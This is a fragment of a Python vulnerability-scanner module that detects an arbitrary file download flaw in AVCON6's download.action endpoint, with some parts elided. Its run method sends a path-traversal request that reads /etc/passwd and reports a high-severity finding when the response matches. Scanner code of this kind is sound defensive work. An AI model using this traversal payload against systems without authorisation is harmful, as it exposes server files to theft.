#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""File Download vulnerability in the download."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AVCON6 - Arbitrary File Download Detection',
        'description': 'File Download vulnerability in the download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/download.action?filename=../../../../../../etc/passwd', allow_redirects=False)
        ...
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="AVCON6 - Arbitrary File Download detected",
